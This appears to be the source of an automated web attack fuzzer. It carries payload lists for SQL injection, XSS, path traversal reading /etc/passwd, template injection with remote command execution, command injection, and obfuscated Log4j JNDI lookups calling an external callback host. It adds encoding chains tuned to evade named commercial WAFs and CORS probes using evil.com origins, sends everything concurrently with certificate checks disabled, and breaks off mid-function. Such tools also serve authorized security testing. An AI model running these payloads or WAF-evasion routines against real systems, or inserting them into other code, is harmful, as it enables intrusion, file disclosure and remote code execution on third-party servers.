import hashlib
import json
import random
import re
import string
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Set
from urllib.parse import quote, urlencode, urlparse, parse_qs

from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("fuzzer_engine")

SQL_ERROR_PATTERNS = [
    ("mysql", ["you have an error in your sql syntax", "warning: mysql",
               "mysql_num_rows", "mysql_fetch", "mysqli", "valid mysql result",
               "supplied argument is not a valid mysql"]),
    ("mssql", ["microsoft ole db provider for odbc drivers",
               "microsoft ole db provider for sql server",
               "incorrect syntax near", "unclosed quotation mark",
               "unexpected end of sql command"]),
    ("postgresql", ["pg_query", "pg_exec", "postgresql", "org.postgresql"]),
    ("oracle", ["ora-00933", "ora-00921", "ora-01756", "ora-", "oracle"]),
    ("sqlite", ["sqlite3", "sqlite_error", "sqlstate"]),
    ("generic", ["sql syntax", "invalid query", "column count doesn't match",
                 "pdoexception", "com.mysql", "jdbcexception"]),
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
    '"><svg/onload=confirm(1)>',
    "{{constructor.constructor('alert(1)')()}}",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<img src=x onerror="alert(1)">',
    '<div onmouseover="alert(1)">hover</div>',
    '"><img src=x onerror=prompt(1)>',
    "';alert(1);//",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=`x` onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
]

PATH_TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "root:"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("....//....//....//etc/passwd", "root:"),
    ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
    ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
    ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "root:"),
    ("..%00/etc/passwd", "root:"),
    ("/proc/self/environ", "PATH="),
    ("/proc/self/cmdline", ""),
    ("..;/..;/..;/etc/passwd", "root:"),
    ("/etc/passwd%00.html", "root:"),
    ("file:///etc/passwd", "root:"),
    ("....//....//....//....//etc/passwd", "root:"),
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "FreeMarker/Mako"),
    ("<%= 7*7 %>", "49", "ERB/EJS"),
    ("#{7*7}", "49", "Thymeleaf/Pug"),
    ("{{config}}", "SECRET", "Jinja2/Flask"),
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "__subclasses__", "Jinja2 RCE"),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "exec", "Thymeleaf/Spring"),
    ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid=", "Jinja2 RCE"),
    ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "uid=", "Jinja2 RCE"),
    ("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", "root:", "Jinja2 File Read"),
    ("${{7*7}}", "49", "AngularJS"),
    ("{{= 7*7}}", "49", "Vue SSR"),
    ("{% if 7*7==49 %}VULN{% endif %}", "VULN", "Jinja2 Conditional"),
    ("${class.forName('java.lang.Runtime').getRuntime().exec('id')}", "exec", "Velocity"),
]

LOG4J_PAYLOADS = [
    "${jndi:ldap://TARGET/wyqyan}",
    "${${lower:j}ndi:ldap://TARGET/wyqyan}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://TARGET/wyqyan}",
    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//TARGET/wyqyan}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://TARGET/wyqyan}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://TARGET/wyqyan}",
    "${${what:-j}${what:-n}${what:-d}${what:-i}:ldap://TARGET/wyqyan}",
    "${${upper:j}ndi:ldap://TARGET/wyqyan}",
    "${${lower:jndi}:${lower:ldap}://TARGET/wyqyan}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//TARGET/wyqyan}",
    "${${::-${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://TARGET/wyqyan}}",
    "${${date:j}${date:n}${date:d}${date:i}:ldap://TARGET/wyqyan}",
    "${${main:j}${main:n}${main:d}${main:i}:ldap://TARGET/wyqyan}",
    "${${sys:j}${sys:n}${sys:d}${sys:i}:ldap://TARGET/wyqyan}",
]

CMD_INJECTION_PAYLOADS = [
    (";id", "uid="),
    ("|id", "uid="),
    ("||id", "uid="),
    ("&&id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    (";cat /etc/passwd", "root:"),
    ("|cat /etc/passwd", "root:"),
    ("$(cat /etc/passwd)", "root:"),
    ("`cat /etc/passwd`", "root:"),
    ("%0aid", "uid="),
    ("%0a%0did", "uid="),
    ("'%0aid'", "uid="),
    ('"\\nid"', "uid="),
    (";sleep 5", "sleep"),
    ("|sleep 5", "sleep"),
    ("$(sleep 5)", "sleep"),
    (";ping -c 5 127.0.0.1", "ping"),
    ("|ping -n 5 127.0.0.1", "ping"),
    (";uname -a", "Linux"),
    ("|uname -a", "Linux"),
    (";whoami", ""),
    ("|whoami", ""),
    ("\nid", "uid="),
    ("\r\nid", "uid="),
]

CORS_PAYLOADS = [
    {"Origin": "https://evil.com"},
    {"Origin": "null"},
    {"Origin": "https://TARGET.evil.com"},
    {"Origin": "https://subdomain.TARGET"},
    {"Origin": "evil.TARGET"},
    {"Origin": "http://127.0.0.1"},
    {"Origin": "http://localhost"},
]

HEADERS_TO_FUZZ = [
    "X-Forwarded-For", "X-Real-IP", "X-Original-URL",
    "X-Rewrite-URL", "X-Custom-IP-Authorization",
    "Referer", "X-Forwarded-Host", "X-Host",
    "Client-IP", "True-Client-IP", "Cluster-Client-IP",
    "X-ProxyUser-IP", "Base-Url", "X-Original-Forwarded-For",
    "X-Forwarded-Proto", "X-Forwarded-Scheme",
    "X-HTTP-Method-Override", "X-Method-Override",
    "X-HTTP-Method", "X-CSRF-Token",
]

COMMON_PARAM_NAMES = [
    "id", "page", "file", "path", "url", "redirect", "next",
    "search", "q", "query", "keyword", "name", "user", "username",
    "email", "token", "key", "api_key", "secret", "password",
    "cmd", "command", "exec", "action", "do", "func", "method",
    "type", "sort", "order", "dir", "limit", "offset",
    "callback", "jsonp", "format", "lang", "locale",
    "debug", "test", "admin", "root",
]

ENCODING_CHAINS = {
    "plain": lambda p: p,
    "url_single": lambda p: urllib.parse.quote(p),
    "url_double": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    "url_triple": lambda p: urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(p))),
    "unicode": lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
    "hex": lambda p: ''.join(f'%{ord(c):02x}' for c in p),
    "base64": lambda p: __import__('base64').b64encode(p.encode()).decode(),
    "html_entity": lambda p: ''.join(f'&#{ord(c)};' for c in p),
    "utf16": lambda p: ''.join(f'%u{ord(c):04x}' for c in p),
    "mixed_case": lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
    "null_byte": lambda p: '\x00'.join(p),
    "tab_replace": lambda p: p.replace(' ', '\t'),
    "newline_inject": lambda p: p.replace(' ', '\n'),
}

WAF_EVASION_TECHNIQUES = {
    "cloudflare": ["url_double", "unicode", "mixed_case", "tab_replace"],
    "aws_waf": ["url_double", "hex", "base64", "null_byte"],
    "akamai": ["url_triple", "unicode", "html_entity"],
    "imperva": ["url_double", "mixed_case", "newline_inject"],
    "f5": ["url_single", "hex", "tab_replace"],
    "fortinet": ["url_double", "unicode", "null_byte"],
    "modsecurity": ["url_triple", "mixed_case", "html_entity", "newline_inject"],
    "generic": ["url_double", "unicode", "mixed_case", "hex", "null_byte"],
}

BLIND_TIME_THRESHOLD = 3.0
DIFF_SIMILARITY_THRESHOLD = 0.85


class ResponseDiffAnalyzer:
    def __init__(self):
        self.baseline_body = ""
        self.baseline_headers = {}
        self.baseline_status = 0
        self.baseline_length = 0
        self.baseline_time = 0.0
        self.baseline_title = ""
        self.baseline_links: Set[str] = set()
        self.baseline_forms: List[Dict] = []
        self.baseline_word_count = 0
        self.baseline_line_count = 0
        self.baseline_scripts: List[str] = []
        self.baseline_comments: List[str] = []

    def set_baseline(self, resp: Dict):
        if not resp:
            return
        body = str(resp.get("text", ""))
        self.baseline_body = body
        self.baseline_headers = resp.get("headers", {})
        self.baseline_status = resp.get("status_code", 0)
        self.baseline_length = len(body)
        self.baseline_time = resp.get("response_time", 0.0)
        self.baseline_word_count = len(body.split())
        self.baseline_line_count = body.count('\n')

        title_match = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
        self.baseline_title = title_match.group(1).strip() if title_match else ""

        self.baseline_links = set(re.findall(r'href=["\'](.*?)["\']', body, re.IGNORECASE))
        self.baseline_forms = re.findall(r'<form[^>]*>(.*?)</form>', body, re.IGNORECASE | re.DOTALL)
        self.baseline_scripts = re.findall(r'<script[^>]*src=["\'](.*?)["\']', body, re.IGNORECASE)
        self.baseline_comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)

    def analyze_diff(self, resp: Dict) -> Dict:
        if not resp or not self.baseline_body:
            return {"significant_diff": False, "diff_score": 0, "details": []}

        body = str(resp.get("text", ""))
        status = resp.get("status_code", 0)
        length = len(body)
        resp_time = resp.get("response_time", 0.0)

        diffs = []
        total_score = 0.0

        if status != self.baseline_status:
            score = 0.3
            total_score += score
            diffs.append({
                "type": "status_code",
                "baseline": self.baseline_status,
                "current": status,
                "score": score,
                "detail": f"状态码变化: {self.baseline_status} -> {status}"
            })

        length_ratio = abs(length - self.baseline_length) / max(self.baseline_length, 1)
        if length_ratio > 0.1:
            score = min(length_ratio * 2, 0.5)
            total_score += score
            diffs.append({
                "type": "response_length",
                "baseline": self.baseline_length,
                "current": length,
                "ratio": round(length_ratio, 3),
                "score": score,
                "detail": f"响应长度变化: {self.baseline_length} -> {length} ({length_ratio:.1%})"
            })

        time_diff = resp_time - self.baseline_time
        if time_diff > BLIND_TIME_THRESHOLD:
            score = min(time_diff / 10, 0.6)
            total_score += score
            diffs.append({
                "type": "time_delay",
                "baseline": round(self.baseline_time, 3),
                "current": round(resp_time, 3),
                "delay": round(time_diff, 3),
                "score": score,
                "detail": f"响应延迟: {self.baseline_time:.2f}s -> {resp_time:.2f}s (+{time_diff:.2f}s)"
            })

        title_match = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
        current_title = title_match.group(1).strip() if title_match else ""
        if current_title != self.baseline_title and current_title:
            score = 0.15
            total_score += score
            diffs.append({
                "type": "title_change",
                "baseline": self.baseline_title[:80],
                "current": current_title[:80],
                "score": score,
                "detail": f"页面标题变化: '{self.baseline_title[:50]}' -> '{current_title[:50]}'"
            })

        current_links = set(re.findall(r'href=["\'](.*?)["\']', body, re.IGNORECASE))
        link_diff = len(current_links.symmetric_difference(self.baseline_links))
        if link_diff > 3:
            score = min(link_diff * 0.02, 0.2)
            total_score += score
            diffs.append({
                "type": "links_changed",
                "baseline_count": len(self.baseline_links),
                "current_count": len(current_links),
                "diff_count": link_diff,
                "score": score,
                "detail": f"链接数量变化: {len(self.baseline_links)} -> {len(current_links)} (差异: {link_diff})"
            })

        word_count = len(body.split())
        word_ratio = abs(word_count - self.baseline_word_count) / max(self.baseline_word_count, 1)
        if word_ratio > 0.15:
            score = min(word_ratio, 0.2)
            total_score += score
            diffs.append({
                "type": "word_count",
                "baseline": self.baseline_word_count,
                "current": word_count,
                "ratio": round(word_ratio, 3),
                "score": score,
                "detail": f"词数变化: {self.baseline_word_count} -> {word_count}"
            })

        current_comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        if len(current_comments) != len(self.baseline_comments):
            score = 0.1
            total_score += score
            diffs.append({
                "type": "comments_changed",
                "baseline": len(self.baseline_comments),
                "current": len(current_comments),
                "score": score,
                "detail": f"HTML注释数量变化: {len(self.baseline_comments)} -> {len(current_comments)}"
            })

        return {
            "significant_diff": total_score > 0.3,
            "diff_score": round(total_score, 3),
            "details": diffs,
            "summary": f"响应差异分数: {total_score:.2f} ({len(diffs)} 项差异)"
        }


class ParameterDiscoverer:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.discovered_params: Dict[str, List[str]] = {}
        self.discovered_forms: List[Dict] = []
        self.discovered_endpoints: Set[str] = set()
        self.crawled_pages: Set[str] = set()

    def discover(self) -> Dict:
        self._crawl_homepage()
        self._extract_url_params()
        self._extract_form_params()
        self._discover_api_endpoints()
        self._brute_common_params()
        return {
            "url_params": self.discovered_params,
            "forms": self.discovered_forms,
            "endpoints": list(self.discovered_endpoints),
            "total_inputs": sum(len(v) for v in self.discovered_params.values()) + len(self.discovered_forms),
        }

    def _crawl_homepage(self):
        try:
            resp = http_request("GET", self.target_url, timeout=self.timeout, verify=False)
            if not resp:
                return
            body = str(resp.get("text", ""))
            self.crawled_pages.add(self.target_url)

            links = re.findall(r'href=["\'](.*?)["\']', body, re.IGNORECASE)
            base = urlparse(self.target_url)
            for link in links[:30]:
                if link.startswith("#") or link.startswith("javascript:") or link.startswith("mailto:"):
                    continue
                if link.startswith("/"):
                    full_url = f"{base.scheme}://{base.netloc}{link}"
                elif link.startswith("http"):
                    if base.netloc in link:
                        full_url = link
                    else:
                        continue
                else:
                    full_url = f"{self.target_url}/{link}"
                self.discovered_endpoints.add(full_url)

            script_srcs = re.findall(r'<script[^>]*src=["\'](.*?)["\']', body, re.IGNORECASE)
            for src in script_srcs:
                if src.endswith(".js"):
                    if src.startswith("/"):
                        js_url = f"{base.scheme}://{base.netloc}{src}"
                    elif src.startswith("http"):
                        js_url = src
                    else:
                        js_url = f"{self.target_url}/{src}"
                    self._extract_from_js(js_url)
        except Exception as e:
            logger.debug(f"Crawl error: {e}")

    def _extract_from_js(self, js_url: str):
        try:
            resp = http_request("GET", js_url, timeout=self.timeout, verify=False)
            if not resp:
                return
            body = str(resp.get("text", ""))
            api_patterns = [
                r'["\'](/api/[^"\'\s]+)["\']',
                r'["\'](/\w+/\w+/\w+)["\']',
                r'fetch\(["\']([^"\']+)["\']',
                r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
                r'\.ajax\(\{["\']url["\']:\s*["\']([^"\']+)["\']',
            ]
            for pattern in api_patterns:
                matches = re.findall(pattern, body)
                for m in matches:
                    if m.startswith("/"):
                        base = urlparse(self.target_url)
                        self.discovered_endpoints.add(f"{base.scheme}://{base.netloc}{m}")
        except Exception:
            pass

    def _extract_url_params(self):
        parsed = urlparse(self.target_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            self.discovered_params["query_string"] = list(params.keys())

    def _extract_form_params(self):
        try:
            resp = http_request("GET", self.target_url, timeout=self.timeout, verify=False)
            if not resp:
                return
            body = str(resp.get("text", ""))
            forms = re.findall(r'<form[^>]*?>(.*?)</form>', body, re.IGNORECASE | re.DOTALL)
            for form_html in forms:
                action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                form_info = {
                    "action": action_match.group(1) if action_match else "",
                    "method": (method_match.group(1) or "GET").upper(),
                    "inputs": inputs,
                }
                self.discovered_forms.append(form_info)
                for inp in inputs:
                    if "form" not in self.discovered_params:
                        self.discovered_params["form"] = []
                    if inp not in self.discovered_params["form"]:
                        self.discovered_params["form"].append(inp)
        except Exception as e:
            logger.debug(f"Form extraction error: {e}")

    def _discover_api_endpoints(self):
        common_paths = [
            "/api", "/api/v1", "/api/v2", "/api/users", "/api/login",
            "/api/admin", "/api/config", "/api/health", "/api/status",
            "/graphql", "/swagger.json", "/openapi.json", "/v2/api-docs",
            "/actuator", "/actuator/health", "/actuator/info",
            "/.env", "/config.json", "/settings.json",
            "/wp-json", "/wp-admin", "/admin", "/login", "/register",
            "/upload", "/download", "/backup", "/debug", "/test",
        ]
        base = urlparse(self.target_url)
        for path in common_paths:
            url = f"{base.scheme}://{base.netloc}{path}"
            try:
                resp = http_request("GET", url, timeout=3, verify=False)
                if resp and resp.get("status_code", 404) != 404:
                    self.discovered_endpoints.add(url)
            except Exception:
                pass

    def _brute_common_params(self):
        for param in COMMON_PARAM_NAMES:
            test_url = f"{self.target_url}?{param}=test"
            try:
                resp = http_request("GET", test_url, timeout=self.timeout, verify=False)
                if resp:
                    body = str(resp.get("text", ""))
                    if "test" in body:
                        if "reflected" not in self.discovered_params:
                            self.discovered_params["reflected"] = []
                        self.discovered_params["reflected"].append(param)
            except Exception:
                pass


class WAFAdaptiveMutator:
    def __init__(self, waf_name: str = "generic"):
        self.waf_name = waf_name.lower()
        self.evasion_techniques = WAF_EVASION_TECHNIQUES.get(self.waf_name, WAF_EVASION_TECHNIQUES["generic"])
        self.mutation_history: List[Dict] = []
        self.successful_techniques: Set[str] = set()

    def mutate(self, payload: str, technique: str = None) -> str:
        if technique and technique in ENCODING_CHAINS:
            return ENCODING_CHAINS[technique](payload)
        return payload

    def mutate_all(self, payload: str) -> List[Tuple[str, str]]:
        results = []
        for tech in self.evasion_techniques:
            if tech in ENCODING_CHAINS:
                mutated = ENCODING_CHAINS[tech](payload)
                results.append((tech, mutated))
        return results

    def mutate_chain(self, payload: str, techniques: List[str]) -> str:
        result = payload
        for tech in techniques:
            if tech in ENCODING_CHAINS:
                result = ENCODING_CHAINS[tech](result)
        return result

    def record_result(self, technique: str, success: bool):
        self.mutation_history.append({
            "technique": technique,
            "success": success,
            "timestamp": time.time(),
        })
        if success:
            self.successful_techniques.add(technique)

    def get_best_techniques(self) -> List[str]:
        return list(self.successful_techniques) if self.successful_techniques else self.evasion_techniques[:3]

    def generate_adaptive_payloads(self, base_payload: str) -> List[Tuple[str, str]]:
        best = self.get_best_techniques()
        results = []
        for tech in best:
            results.append((tech, self.mutate(base_payload, tech)))
        for i in range(min(len(best), 3)):
            for j in range(i + 1, min(len(best), 3)):
                chain = [best[i], best[j]]
                results.append(("+".join(chain), self.mutate_chain(base_payload, chain)))
        return results


class SmartFuzzer:
    def __init__(self, target_url: str, timeout: int = 10, concurrency: int = 10,
                 waf_name: str = "generic", mode: str = "deep"):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.concurrency = concurrency
        self.mode = mode
        self.diff_analyzer = ResponseDiffAnalyzer()
        self.param_discoverer = ParameterDiscoverer(target_url, timeout)
        self.waf_mutator = WAFAdaptiveMutator(waf_name)
        self.findings: List[Dict] = []
        self.stats = {
            "requests_sent": 0,
            "params_tested": 0,
            "encoding_attempts": 0,
            "start_time": time.time(),
        }

    def smart_fuzz(self) -> Dict:
        logger.info(f"Starting smart fuzz on {self.target_url} (mode={self.mode}, waf={self.waf_mutator.waf_name})")

        self._get_baseline()

        params = self.param_discoverer.discover()
        logger.info(f"Discovered {params['total_inputs']} input points, {len(params['endpoints'])} endpoints")

        all_params = self._collect_all_params(params)

        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = []

            futures.append(executor.submit(self._fuzz_sql_injection, all_params))
            futures.append(executor.submit(self._fuzz_xss, all_params))
            futures.append(executor.submit(self._fuzz_path_traversal, all_params))
            futures.append(executor.submit(self._fuzz_ssti, all_params))
            futures.append(executor.submit(self._fuzz_cmd_injection, all_params))
            futures.append(executor.submit(self._fuzz_log4j, all_params))
            futures.append(executor.submit(self._fuzz_cors))
            futures.append(executor.submit(self._fuzz_header_injection))
            futures.append(executor.submit(self._fuzz_http_methods))
            futures.append(executor.submit(self._fuzz_content_type))

            if self.mode == "deep":
                futures.append(executor.submit(self._fuzz_blind_sqli, all_params))
                futures.append(executor.submit(self._fuzz_xxe, all_params))
                futures.append(executor.submit(self._fuzz_open_redirect, all_params))
                futures.append(executor.submit(self._fuzz_ssrf_params, all_params))
                futures.append(executor.submit(self._fuzz_file_upload, all_params))

            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Fuzz task error: {e}")

        self.stats["duration"] = round(time.time() - self.stats["start_time"], 2)

        critical = sum(1 for f in self.findings if f.get("risk_level") == "critical")
        high = sum(1 for f in self.findings if f.get("risk_level") == "high")
        medium = sum(1 for f in self.findings if f.get("risk_level") == "medium")
        low = sum(1 for f in self.findings if f.get("risk_level") == "low")

        return {
            "target": self.target_url,
            "total_findings": len(self.findings),
            "critical": critical,
            "high": high,
            "medium": medium,
            "low": low,
            "findings": self.findings,
            "stats": self.stats,
            "params_discovered": params,
        }

    def _collect_all_params(self, params: Dict) -> List[str]:
        all_params = []
        for source, param_list in params.get("url_params", {}).items():
            all_params.extend(param_list)
        for form in params.get("forms", []):
            all_params.extend(form.get("inputs", []))
        all_params.extend(COMMON_PARAM_NAMES)
        return list(dict.fromkeys(all_params))

    def _get_baseline(self):
        try:
            resp = http_request("GET", self.target_url, timeout=self.timeout, verify=False)
            if resp:
                self.diff_analyzer.set_baseline(resp)
        except Exception as e:
            logger.debug(f"Baseline error: {e}")

    def _send_with_encoding(self, url: str, method: str = "GET",
                            headers: Dict = None, data: str = None) -> List[Dict]:
        results = []
        for tech_name, encoder in ENCODING_CHAINS.items():
            try:
                encoded_url = url
                if "?" in url:
                    base, qs = url.split("?", 1)
                    encoded_qs = encoder(qs) if tech_name != "plain" else qs
                    encoded_url = f"{base}?{encoded_qs}"

                encoded_headers = {}
                if headers:
                    for k, v in headers.items():
                        encoded_headers[k] = encoder(v) if tech_name != "plain" else v

                encoded_data = encoder(data) if data and tech_name != "plain" else data

                resp = http_request(method, encoded_url, headers=encoded_headers,
                                  data=encoded_data, timeout=self.timeout, verify=False)
                self.stats["requests_sent"] += 1
                self.stats["encoding_attempts"] += 1

                if resp:
                    diff = self.diff_analyzer.analyze_diff(resp)
                    results.append({
                        "technique": tech_name,
                        "response": resp,
                        "diff": diff,
                    })
            except Exception:
                continue
        return results

    def _fuzz_sql_injection(self, params: List[str]):
        sqli_payloads = [
            ("'", "error"),
            ("\"", "error"),
            ("' OR '1'='1", "boolean"),
            ("' OR '1'='1' --", "boolean"),
            ("1' ORDER BY 1--", "error"),
            ("1' ORDER BY 100--", "error"),
            ("1' UNION SELECT NULL--", "union"),
            ("1' UNION SELECT NULL,NULL--", "union"),
            ("1' UNION SELECT NULL,NULL,NULL--", "union"),
            ("1 AND 1=1", "boolean"),
            ("1 AND 1=2", "boolean"),
            ("1' AND '1'='1", "boolean"),
            ("1' AND '1'='2", "boolean"),
            ("1' AND SLEEP(5)--", "time"),
            ("1' AND SLEEP(5) AND '1'='1", "time"),
            ("1; WAITFOR DELAY '0:0:5'--", "time_mssql"),
            ("1'; SELECT pg_sleep(5)--", "time_pg"),
            ("1' AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", "time_sqlite"),
            ("1' OR '1'='1' --", "boolean"),
            ("admin'--", "auth_bypass"),
            ("' OR 1=1--", "auth_bypass"),
            ("') OR ('1'='1", "auth_bypass"),
        ]

        for param in params:
            for payload, sqli_type in sqli_payloads:
                encoded_results = self._send_with_encoding(
                    f"{self.target_url}?{param}={quote(payload)}"
                )
                for result in encoded_results:
                    resp = result["response"]
                    body = str(resp.get("text", "")).lower()
                    diff = result["diff"]

                    for db_type, patterns in SQL_ERROR_PATTERNS:
                        for pattern in patterns:
                            if pattern.lower() in body:
                                self.findings.append({
                                    "type": "sql_injection",
                                    "subtype": f"error_based_{db_type}",
                                    "param": param,
                                    "payload": payload,
                                    "sqli_type": sqli_type,
                                    "encoding": result["technique"],
                                    "evidence": pattern,
                                    "risk_level": "critical",
                                    "detail": f"SQL注入({db_type}): 参数 [{param}] 触发数据库错误",
                                    "diff_score": diff["diff_score"],
                                })
                                self.waf_mutator.record_result(result["technique"], True)
                                break

                    if diff["significant_diff"] and sqli_type in ("boolean", "auth_bypass"):
                        self.findings.append({
                            "type": "sql_injection",
                            "subtype": "boolean_based",
                            "param": param,
                            "payload": payload,
                            "sqli_type": sqli_type,
                            "encoding": result["technique"],
                            "risk_level": "critical",
                            "detail": f"SQL注入(布尔盲注): 参数 [{param}] 响应差异显著",
                            "diff_score": diff["diff_score"],
                        })

                    if diff["significant_diff"]:
                        for d in diff["details"]:
                            if d["type"] == "time_delay" and sqli_type in ("time", "time_mssql", "time_pg", "time_sqlite"):
                                self.findings.append({
                                    "type": "sql_injection",
                                    "subtype": "time_based",
                                    "param": param,
                                    "payload": payload,
                                    "sqli_type": sqli_type,
                                    "encoding": result["technique"],
                                    "delay": d.get("delay", 0),
                                    "risk_level": "critical",
                                    "detail": f"SQL注入(时间盲注): 参数 [{param}] 延迟 {d.get('delay', 0):.2f}s",
                                })

    def _fuzz_xss(self, params: List[str]):
        for param in params:
            for payload in XSS_PAYLOADS:
                encoded_results = self._send_with_encoding(
                    f"{self.target_url}?{param}={quote(payload)}"
                )
                for result in encoded_results:
                    resp = result["response"]
                    body = str(resp.get("text", ""))
                    if payload in body:
                        self.findings.append({
                            "type": "xss_reflected",
                            "param": param,
                            "payload": payload,
                            "encoding": result["technique"],
                            "risk_level": "high",
                            "detail": f"反射型XSS: 参数 [{param}] 未过滤输出",
                        })
                        self.waf_mutator.record_result(result["technique"], True)

    def _fuzz_path_traversal(self, params: List[str]):
        file_params = [p for p in params if p in ("file", "path", "page", "include", "template", "document")]
        if not file_params:
            file_params = params[:5]

        for param in file_params:
            for payload, indicator in PATH_TRAVERSAL_PAYLOADS:
                encoded_results = self._send_with_encoding(
                    f"{self.target_url}?{param}={quote(payload)}"
                )
                for result in encoded_results:
                    resp = result["response"]
                    body = str(resp.get("text", ""))
                    if indicator and indicator.lower() in body.lower():
                        self.findings.append({
                            "type": "path_traversal",
                            "param": param,
                            "payload": payload,
                            "encoding": result["technique"],
                            "risk_level": "critical",
                            "detail": f"路径穿越: 参数 [{param}] 可读取系统文件",
                        })

    def _fuzz_ssti(self, params: List[str]):
        for param in params:
            for payload, marker, engine in SSTI_PAYLOADS:
                encoded_results = self._send_with_encoding(
                    f"{self.target_url}?{param}={quote(payload)}"
                )
                for result in encoded_results:
                    resp = result["response"]
                    body = str(resp.get("text", ""))
                    if marker and marker in body:
                        self.findings.append({
                            "type": "ssti",
                            "param": param,
                            "payload": payload,
                            "engine": engine,
                            "marker": marker,
                            "encoding": result["technique"],
                            "risk_level": "critical",
                            "detail": f"SSTI({engine}): 参数 [{param}] 模板表达式被执行",
                        })

    def _fuzz_cmd_injection(self, params: List[str]):
        for param in params:
            for payload, indicator in CMD_INJECTION_PAYLOADS:
                encoded_results = self._send_with_encoding(
                    f"{self.target_url}?{param}={quote(payload)}"
                )
                for result in encoded_results:
                    resp = result["response"]
                    body = str(resp.get("text", ""))
                    diff = result["diff"]

                    if indicator and indicator in body:
                        self.findings.append({
                            "type": "command_injection",
                            "param": param,
                            "payload": payload,
                            "indicator": indicator,
                            "encoding": result["technique"],
                            "risk_level": "critical",
                            "detail": f"命令注入: 参数 [{param}] 可执行系统命令",
                        })

                    if diff["significant_diff"]:
                        for d in diff["details"]:
                            if d["type"] == "time_delay" and "sleep" in payload:
                                self.findings.append({
                                    "type": "command_injection",
                                    "subtype": "time_based",
                                    "param": param,
                                    "payload": payload,
                                    "encoding": result["technique"],
                                    "delay": d.get("delay", 0),
                                    "risk_level": "critical",
                                    "detail": f"命令注入(时间盲注): 参数 [{param}] 延迟 {d.get('delay', 0):.2f}s",
                                })

    def _fuzz_log4j(self, params: List[str]):
        callback_id = f"wyqyan-{int(time.time())}-{random.randint(1000, 9999)}"
        for payload_template in LOG4J_PAYLOADS:
            payload = payload_template.replace("TARGET", f"{callback_id}.log.interact.sh")
            for param in params[:10]:
                url = f"{self.target_url}?{param}={quote(payload)}"
                headers = {
                    "X-Api-Version": payload,
                    "User-Agent": payload,
                    "Referer": payload,
                    "X-Forwarded-For": payload,
                    "Cookie": f"session={quote(payload)}",
                    "Origin": payload,
                }
                try:
                    http_request("GET", url, headers=headers, timeout=self.timeout, verify=False)
                    self.stats["requests_sent"] += 1
                except Exception:
                    pass

    def _fuzz_cors(self):
        for cors_headers in CORS_PAYLOADS:
            target_domain = urlparse(self.target_url).netloc
            headers = {}
            for k, v in cors_headers.items():
                headers[k] = v.replace("TARGET", target_domain)
            try:
                resp = http_request("GET", self.target_url, headers=headers,
                                  timeout=self.timeout, verify=False)
                self.stats["requests_sent"] += 1
                if resp:
                    resp_headers = resp.get("headers", {})
                    acao = resp_headers.get("access-control-allow-origin", "")
                    acac = resp_headers.get("access-control-allow-credentials", "")
                    if acao:
                        is_vuln = False
                        if acao == "*":
                            is_vuln = True
                        elif "evil" in acao or "null" in acao:
                            is_vuln = True
                        elif headers.get("Origin", "") == acao:
                            is_vuln = True
                        if is_vuln:
                            self.findings.append({
                                "type": "cors_misconfiguration",
                                "origin": headers.get("Origin", ""),
                                "acao": acao,
                                "credentials": acac,
                                "risk_level": "high" if acac == "true" else "medium",
                                "detail": f"CORS配置错误: Origin={headers.get('Origin')} -> ACAO={acao}, Credentials={acac}",
                            })
            except Exception:
                pass

    def _fuzz_header_injection(self):
        for header in HEADERS_TO_FUZZ:
            for value in ["127.0.0.1", "localhost", "0.0.0.0", "admin"]:
                headers = {header: value}
                try:
